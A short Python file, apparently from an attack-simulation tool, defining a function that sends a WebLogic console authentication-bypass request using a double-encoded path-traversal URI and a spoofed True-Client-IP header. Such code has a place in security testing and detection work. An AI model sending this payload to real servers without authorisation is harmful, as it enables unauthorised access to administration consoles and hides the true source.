import requests

# an example attack
def oracle_weblogic_rce(target, source_ip, user_agent, **kwargs):

    # the uri we're going to request
    uri = '/console/images/%252E%252E%252Fconsole.portal/'

    # True-Client-IP needs to be set in order to spoof source ip.
    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip)
              }

    # send the request and get a status_code back
    response = requests.get(target + uri, headers=headers).status_code
    return(str(response))
